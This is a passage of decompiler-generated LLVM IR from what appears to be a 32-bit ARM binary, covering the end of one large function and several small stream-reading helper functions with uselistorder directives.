  %v0_16c40 = load i32, i32* %sl.global-to-local, align 4
  %v1_16c40 = trunc i32 %v0_16c40 to i8
  %v4_16c40 = inttoptr i32 %v1_16c3c to i8*
  store i8 %v1_16c40, i8* %v4_16c40, align 1
  %v0_16c44 = load i32, i32* %r3.global-to-local, align 4
  %v1_16c44 = add i32 %v0_16c44, -1
  store i32 %v1_16c44, i32* %r2.global-to-local, align 4
  %v0_16c48 = load i32, i32* @r4, align 4
  %v1_16c48 = trunc i32 %v0_16c48 to i8
  %v4_16c48 = inttoptr i32 %v1_16c44 to i8*
  store i8 %v1_16c48, i8* %v4_16c48, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_16c50 = load i32, i32* @r7, align 4
  %v1_16c50 = inttoptr i32 %v0_16c50 to i32*
  store i32 112, i32* %v1_16c50, align 4
  %v3_16c50 = add i32 %v0_16c50, 4
  %v4_16c50 = inttoptr i32 %v3_16c50 to i32*
  %v5_16c50 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_16c50, i32* %v4_16c50, align 4
  %v0_16c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c54 = load i32, i32* @r7, align 4
  %v2_16c54 = add i32 %v1_16c54, 8
  %v3_16c54 = inttoptr i32 %v2_16c54 to i32*
  store i32 %v0_16c54, i32* %v3_16c54, align 4
  %v0_16c58 = load i32, i32* @r7, align 4
  %v1_16c58 = add i32 %v0_16c58, 12
  store i32 %v1_16c58, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16bd4, %.thread121, %dec_label_pc_16c3c
  %v1_16c68.pre = phi i32 [ %v2_16734, %.thread121 ], [ %v1_16c58, %dec_label_pc_16c3c ], [ %v1_16c68.pre.pre, %dec_label_pc_16bd4 ]
  %v2_16c5c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_16c5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16c60

dec_label_pc_16c60:                               ; preds = %dec_label_pc_16c60, %dec_label_pc_16c5c
  %v0_16c60 = phi i32 [ %v2_16c5c, %dec_label_pc_16c5c ], [ %v4_16c60, %dec_label_pc_16c60 ]
  %stack_var_-188.0 = phi i32 [ %v3_165d0, %dec_label_pc_16c5c ], [ %v2_16c6c, %dec_label_pc_16c60 ]
  %v1_16c60 = inttoptr i32 %v0_16c60 to i32*
  %v2_16c60 = load i32, i32* %v1_16c60, align 4
  store i32 %v2_16c60, i32* %r3.global-to-local, align 4
  %v4_16c60 = add i32 %v0_16c60, 12
  store i32 %v4_16c60, i32* %r2.global-to-local, align 4
  %v3_16c68 = icmp ult i32 %v4_16c60, %v1_16c68.pre
  %v2_16c6c = sub i32 %stack_var_-188.0, %v2_16c60
  store i32 %v2_16c6c, i32* %ip.global-to-local, align 4
  br i1 %v3_16c68, label %dec_label_pc_16c60, label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c60
  %v3_16c78 = load i8, i8* %stack_var_-46, align 1
  %v4_16c78 = sext i8 %v3_16c78 to i32
  store i32 %v4_16c78, i32* %r3.global-to-local, align 4
  store i32 %v4_16c78, i32* %r2.global-to-local, align 4
  %v2_16c7c = icmp eq i8 %v3_16c78, 0
  store i1 %v2_16c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16c7c, label %bb250, label %bb249

bb249:                                            ; preds = %dec_label_pc_16c78
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb250

bb250:                                            ; preds = %dec_label_pc_16c78, %bb249
  %v1_16cdc = phi i32 [ %v4_16c78, %dec_label_pc_16c78 ], [ 1, %bb249 ]
  %v2_16c84 = sub i32 %v2_16c6c, %v1_16cdc
  store i32 %v2_16c84, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_16c8c = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_16c8c, i32* %r3.global-to-local, align 4
  %v2_16c90 = icmp eq i32 %v2_16c84, 0
  store i1 %v2_16c90, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp251 = icmp slt i32 %v2_16c84, 1
  br i1 %tmp251, label %dec_label_pc_16cf8, label %dec_label_pc_16ca4

dec_label_pc_16ca4:                               ; preds = %bb250
  %v3_16ca4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16ca4, i32* %lr.global-to-local, align 4
  %v1_16ca8 = add i32 %v3_16ca4, 12
  %v2_16ca8 = inttoptr i32 %v1_16ca8 to i32*
  %v3_16ca8 = load i32, i32* %v2_16ca8, align 4
  store i32 %v3_16ca8, i32* %r3.global-to-local, align 4
  %v1_16cac = and i32 %v3_16ca8, 8
  %v2_16cac = icmp eq i32 %v1_16cac, 0
  store i1 %v2_16cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16cac, label %dec_label_pc_16cd0, label %dec_label_pc_16cb4

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16ca4
  store i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b323.473 to i32), i32* %r3.global-to-local, align 4
  %v1_16cc4 = add i32 %v1_16c68.pre, 12
  store i32 %v1_16cc4, i32* %r6.global-to-local, align 4
  %v1_16cc8 = inttoptr i32 %v1_16c68.pre to i32*
  store i32 160, i32* %v1_16cc8, align 4
  %v3_16cc8 = add i32 %v1_16c68.pre, 4
  %v4_16cc8 = inttoptr i32 %v3_16cc8 to i32*
  %v5_16cc8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16cc8, i32* %v4_16cc8, align 4
  %v6_16cc8 = add i32 %v1_16c68.pre, 8
  %v7_16cc8 = inttoptr i32 %v6_16cc8 to i32*
  %v8_16cc8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_16cc8, i32* %v7_16cc8, align 4
  br label %dec_label_pc_16cfc

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16ca4
  store i32 %v3_16ca4, i32* %ip.global-to-local, align 4
  %v1_16cd4 = add i32 %v3_16ca4, 16
  %v2_16cd4 = inttoptr i32 %v1_16cd4 to i32*
  %v3_16cd4 = load i32, i32* %v2_16cd4, align 4
  store i32 %v3_16cd4, i32* %r3.global-to-local, align 4
  %v7_16cd8 = icmp eq i32 %v3_16cd4, 48
  store i1 %v7_16cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16cd8, label %.thread54.thread70, label %bb252

bb252:                                            ; preds = %dec_label_pc_16cd0
  store i32 %v2_16c6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16cf8

.thread54.thread70:                               ; preds = %dec_label_pc_16cd0
  %v4_16ce4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_16c68.pre, i32* %r6.global-to-local, align 4
  %v3_16cec = add i32 %v4_16ce4, %v2_16c84
  store i32 %v3_16cec, i32* %r3.global-to-local, align 4
  store i32 %v3_16cec, i32* %stack_var_-164, align 4
  br label %dec_label_pc_16cfc

dec_label_pc_16cf8:                               ; preds = %bb252, %bb250
  store i32 %v1_16c68.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16cfc

dec_label_pc_16cfc:                               ; preds = %.thread54.thread70, %dec_label_pc_16cb4, %dec_label_pc_16cf8
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16d00 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16d00, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16d04

dec_label_pc_16d04:                               ; preds = %dec_label_pc_16d2c, %dec_label_pc_16cfc
  %v0_16d04 = phi i32 [ %v1_16d20, %dec_label_pc_16d2c ], [ %v2_16d00, %dec_label_pc_16cfc ]
  %v1_16d04 = inttoptr i32 %v0_16d04 to i32*
  %v2_16d04 = load i32, i32* %v1_16d04, align 4
  store i32 %v2_16d04, i32* %r1.global-to-local, align 4
  %v3_16d04 = add i32 %v0_16d04, 4
  %v4_16d04 = inttoptr i32 %v3_16d04 to i32*
  %v5_16d04 = load i32, i32* %v4_16d04, align 4
  store i32 %v5_16d04, i32* %r2.global-to-local, align 4
  %v6_16d04 = add i32 %v0_16d04, 8
  %v7_16d04 = inttoptr i32 %v6_16d04 to i32*
  %v8_16d04 = load i32, i32* %v7_16d04, align 4
  store i32 %v8_16d04, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 93464, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_16d18 = load i32, i32* %r5.global-to-local, align 4
  %v1_16d18 = add i32 %v0_16d18, 4
  %v2_16d18 = inttoptr i32 %v1_16d18 to i32*
  %v3_16d18 = load i32, i32* %v2_16d18, align 4
  store i32 %v3_16d18, i32* %r3.global-to-local, align 4
  %v0_16d1c = load i32, i32* %r0.global-to-local, align 4
  %v9_16d1c = icmp eq i32 %v0_16d1c, %v3_16d18
  store i1 %v9_16d1c, i1* %cpsr_z.global-to-local, align 1
  %v1_16d20 = add i32 %v0_16d18, 12
  store i32 %v1_16d20, i32* %r5.global-to-local, align 4
  br i1 %v9_16d1c, label %dec_label_pc_16d2c, label %bb253

bb253:                                            ; preds = %dec_label_pc_16d04
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d4c

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16d04
  %v0_16d30.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_16d2c = load i32, i32* %r6.global-to-local, align 4
  %v3_16d2c = icmp ult i32 %v1_16d20, %v1_16d2c
  %v9_16d2c = icmp eq i32 %v1_16d20, %v1_16d2c
  store i1 %v9_16d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d30 = add i32 %v0_16d30.pre, %v3_16d18
  store i32 %v2_16d30, i32* %r7.global-to-local, align 4
  br i1 %v3_16d2c, label %dec_label_pc_16d04, label %dec_label_pc_16d4c

dec_label_pc_16d44:                               ; preds = %.thread21, %bb235
  %v0_16d44 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16d44, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16a44

dec_label_pc_16d4c:                               ; preds = %dec_label_pc_16d2c, %bb253
  %v0_16d4c = phi i32 [ -1, %bb253 ], [ %v2_16d30, %dec_label_pc_16d2c ]
  store i32 %v0_16d4c, i32* %r0.global-to-local, align 4
  store i32 %v3_16588, i32* %r4.global-to-local, align 4
  store i32 %v6_16588, i32* @r5, align 4
  store i32 %v9_16588, i32* @r6, align 4
  store i32 %v12_16588, i32* @r7, align 4
  store i32 %v27_16588, i32* @lr, align 4
  ret i32 %v0_16d4c

; uselistorder directives
  uselistorder i32 %v0_16d4c, { 1, 0 }
  uselistorder i32 %v1_16d2c, { 1, 0 }
  uselistorder i32 %v1_16d20, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16d04, { 2, 1, 0 }
  uselistorder i32 %v3_16ca4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16c6c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_16c60, { 1, 2, 0 }
  uselistorder i32 %v0_16c60, { 1, 0 }
  uselistorder i32 %v1_16c68.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_16c20, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_16c04, { 1, 0 }
  uselistorder i32 %storemerge155, { 1, 0 }
  uselistorder i32 %v0_16be0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_16ba8, { 1, 0 }
  uselistorder i32 %v1_16ba8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16ba4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_16b04, { 2, 1, 0 }
  uselistorder i32 %v2_16a84, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_16a74, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_16a60, { 1, 0, 2 }
  uselistorder i32 %v5_16a5c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16aec30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_16a14, { 1, 0 }
  uselistorder i32 %v1_16a0c, { 1, 2, 0 }
  uselistorder i32 %v2_16a00, { 1, 0 }
  uselistorder i32 %v1_16a00, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16a00, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_169d0, { 1, 0 }
  uselistorder i32 %v0_169d0, { 0, 2, 1 }
  uselistorder i32 %v2_169cc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_169b8, { 1, 0 }
  uselistorder i1 %v2_169a8, { 1, 0 }
  uselistorder i32 %v1_169a4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_169a0, { 1, 0 }
  uselistorder i1 %v2_16990, { 1, 0 }
  uselistorder i32 %v1_16984, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_16938, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16938, { 1, 0, 2 }
  uselistorder i1 %v2_16920, { 1, 0 }
  uselistorder i32 %v5_16908, { 1, 0 }
  uselistorder i32 %v0_168f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_168d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_168b4, { 1, 0 }
  uselistorder i32 %v0_16870, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16818, { 1, 0 }
  uselistorder i32 %v5_167d8, { 1, 0, 2 }
  uselistorder i32 %v2_167d8, { 1, 0, 2 }
  uselistorder i32 %v2_1679c, { 1, 0, 2 }
  uselistorder i32 %v0_16798, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_16794, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1678c, { 1, 0 }
  uselistorder i32 %v2_167c8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1675c, { 1, 0 }
  uselistorder i32 %v5_16718, { 1, 0 }
  uselistorder i32 %v1_16638.v0_166245, { 1, 0 }
  uselistorder i32 %v3_166f4, { 1, 0 }
  uselistorder i32 %v0_166d0, { 3, 2, 1, 0 }
  uselistorder i32 %v2_166b8, { 2, 1, 0 }
  uselistorder i32 %v0_1669c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_165bc, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp182, { 0, 1, 2, 5, 4, 3, 7, 6, 8 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 10, 1, 11, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 40, 27, 31, 28, 29, 30, 32, 25, 33, 34, 35, 36, 37, 38, 39, 62, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 63, 64, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 34, 33, 35, 36, 37, 40, 38, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 13, 14, 11, 15, 16, 17, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 8, 9, 39, 36, 38, 40, 10, 11, 37, 12, 13, 41, 15, 14, 16, 17, 18, 42, 19, 21, 20, 22, 1, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 33, 34, 2, 35, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 (i32, i32)* @function_18dd8, { 1, 0, 2 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 48, { 2, 4, 5, 6, 7, 8, 0, 1, 9, 3 }
  uselistorder i32 17, { 5, 0, 4, 6, 1, 2, 7, 3, 8 }
  uselistorder i8 58, { 2, 1, 3, 0 }
  uselistorder i32 58, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @function_103c8, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_197b8, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 96, { 3, 4, 1, 2, 0 }
  uselistorder i8 45, { 1, 3, 2, 0, 4, 5, 6 }
  uselistorder i32 45, { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32)* @function_19788, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1949c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_19770, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), { 1, 3, 2, 0, 4 }
  uselistorder i32 97, { 1, 0, 5, 2, 3, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_16d44, { 1, 0 }
  uselistorder label %dec_label_pc_16cfc, { 2, 0, 1 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16bd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ba4, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_16b7c, { 1, 0 }
  uselistorder label %dec_label_pc_16b50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16afc, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a44, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16a34, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %.thread142, { 1, 0 }
  uselistorder label %._crit_edge91, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %dec_label_pc_1695c, { 2, 1, 0 }
  uselistorder label %bb216, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16868, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16818, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16810, { 1, 0 }
  uselistorder label %bb208, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_166f4, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16610, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
}

define i32 @function_16d7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d7c:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16d7c = load i32, i32* @r4, align 4
  store i32 %v3_16d7c, i32* %stack_var_-16, align 4
  %v6_16d7c = load i32, i32* @r5, align 4
  %v12_16d7c = load i32, i32* @lr, align 4
  %v1_16d80 = add i32 %arg1, 52
  %v2_16d80 = inttoptr i32 %v1_16d80 to i32*
  %v3_16d80 = load i32, i32* %v2_16d80, align 4
  %v2_16d88 = icmp eq i32 %v3_16d80, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 144312, i32* %r6.global-to-local, align 4
  br i1 %v2_16d88, label %dec_label_pc_16dc0, label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d7c
  %v1_16d9c = add i32 %arg1, 16
  %v2_16d9c = inttoptr i32 %v1_16d9c to i32*
  %v3_16d9c = load i32, i32* %v2_16d9c, align 4
  %v1_16da0 = add i32 %arg1, 24
  %v2_16da0 = inttoptr i32 %v1_16da0 to i32*
  %v3_16da0 = load i32, i32* %v2_16da0, align 4
  %v3_16da4 = icmp ult i32 %v3_16d9c, %v3_16da0
  br i1 %v3_16da4, label %.thread, label %dec_label_pc_16db4

.thread:                                          ; preds = %dec_label_pc_16d9c
  %v2_16da8 = inttoptr i32 %v3_16d9c to i8*
  %v3_16da8 = load i8, i8* %v2_16da8, align 1
  %v4_16da8 = zext i8 %v3_16da8 to i32
  store i32 %v4_16da8, i32* %r4.global-to-local, align 4
  %v6_16da8 = add i32 %v3_16d9c, 1
  store i32 %v6_16da8, i32* %v2_16d9c, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d9c
  %v1_16db4 = inttoptr i32 %arg1 to i16*
  %v2_16db4 = call i32 @function_172a8(i16* %v1_16db4)
  store i32 %v2_16db4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16d7c
  %v1_16dc4 = add i32 %arg1, 56
  store i32 %v1_16dc4, i32* @r4, align 4
  %v4_16dd8 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16dd8)
  %v0_16dec = load i32, i32* %r6.global-to-local, align 4
  %v2_16dec = add i32 %v0_16dec, 20
  %v3_16dec = inttoptr i32 %v2_16dec to i32*
  %v4_16dec = load i32, i32* %v3_16dec, align 4
  store i32 93688, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16dec)
  %v0_16df8 = load i32, i32* @r5, align 4
  %v1_16df8 = add i32 %v0_16df8, 16
  %v2_16df8 = inttoptr i32 %v1_16df8 to i32*
  %v3_16df8 = load i32, i32* %v2_16df8, align 4
  %v1_16dfc = add i32 %v0_16df8, 24
  %v2_16dfc = inttoptr i32 %v1_16dfc to i32*
  %v3_16dfc = load i32, i32* %v2_16dfc, align 4
  %v3_16e00 = icmp ult i32 %v3_16df8, %v3_16dfc
  br i1 %v3_16e00, label %.thread2, label %dec_label_pc_16e10

.thread2:                                         ; preds = %dec_label_pc_16dc0
  %v2_16e04 = inttoptr i32 %v3_16df8 to i8*
  %v3_16e04 = load i8, i8* %v2_16e04, align 1
  %v4_16e04 = zext i8 %v3_16e04 to i32
  store i32 %v4_16e04, i32* %r4.global-to-local, align 4
  %v6_16e04 = add i32 %v3_16df8, 1
  store i32 %v6_16e04, i32* %v2_16df8, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16dc0
  %v1_16e14 = inttoptr i32 %v0_16df8 to i16*
  %v2_16e14 = call i32 @function_172a8(i16* %v1_16e14)
  store i32 %v2_16e14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %.thread2, %dec_label_pc_16e10
  %v0_16e28 = load i32, i32* %r6.global-to-local, align 4
  %v2_16e28 = add i32 %v0_16e28, 28
  %v3_16e28 = inttoptr i32 %v2_16e28 to i32*
  %v4_16e28 = load i32, i32* %v3_16e28, align 4
  store i32 %v4_16e28, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16e28)
  br label %dec_label_pc_16e34

dec_label_pc_16e34:                               ; preds = %.thread, %dec_label_pc_16db4, %dec_label_pc_16e1c
  %v0_16e34 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e3c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16e3c, i32* @r4, align 4
  store i32 %v6_16d7c, i32* @r5, align 4
  store i32 %v12_16d7c, i32* @lr, align 4
  ret i32 %v0_16e34

; uselistorder directives
  uselistorder i32 %v3_16df8, { 1, 0, 2 }
  uselistorder i32 %v3_16d9c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 5, 4, 1, 2 }
  uselistorder label %dec_label_pc_16e34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e1c, { 1, 0 }
}

define i32 @function_16e48(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e48:
  %v0_16e48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e48, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16e48
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16e48, %bb
  %v10_16e54 = phi i32 [ %arg1, %dec_label_pc_16e48 ], [ 0, %bb ]
  ret i32 %v10_16e54

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_16e58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16e58:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16e58 = load i32, i32* @r4, align 4
  store i32 %v3_16e58, i32* %stack_var_-28, align 4
  %v6_16e58 = load i32, i32* @r5, align 4
  %v9_16e58 = load i32, i32* @r6, align 4
  %v12_16e58 = load i32, i32* @r7, align 4
  %v21_16e58 = load i32, i32* @lr, align 4
  %v1_16e5c = add i32 %arg3, 52
  %v2_16e5c = inttoptr i32 %v1_16e5c to i32*
  %v3_16e5c = load i32, i32* %v2_16e5c, align 4
  %v1_16e64 = sub i32 1, %v3_16e5c
  %v2_16e64 = icmp ult i32 %v3_16e5c, 2
  br i1 %v2_16e64, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_16e58
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16e58, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_16e64, %dec_label_pc_16e58 ]
  %v0_16e6c = phi i32 [ 0, %bb ], [ %v1_16e64, %dec_label_pc_16e58 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_16e6c = icmp eq i32 %v0_16e6c, 0
  store i32 144312, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_16e6c, label %dec_label_pc_16ec0, label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %bb16
  %v1_16e8c = add i32 %arg3, 56
  store i32 %v1_16e8c, i32* @r4, align 4
  %v4_16ea0 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16ea0)
  %v0_16eb4 = load i32, i32* @r5, align 4
  %v2_16eb4 = add i32 %v0_16eb4, 20
  %v3_16eb4 = inttoptr i32 %v2_16eb4 to i32*
  %v4_16eb4 = load i32, i32* %v3_16eb4, align 4
  store i32 %v4_16eb4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16ec0.484 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16eb4)
  %v0_16ec0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_16ec4.pre = load i32, i32* @r7, align 4
  %v0_16ec8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %bb16, %dec_label_pc_16e88
  %v0_16ec8 = phi i32 [ %arg3, %bb16 ], [ %v0_16ec8.pre, %dec_label_pc_16e88 ]
  %v0_16ec4 = phi i32 [ %arg2, %bb16 ], [ %v0_16ec4.pre, %dec_label_pc_16e88 ]
  %v0_16ec0 = phi i32 [ %arg1, %bb16 ], [ %v0_16ec0.pre, %dec_label_pc_16e88 ]
  %v3_16ecc = inttoptr i32 %v0_16ec0 to i8*
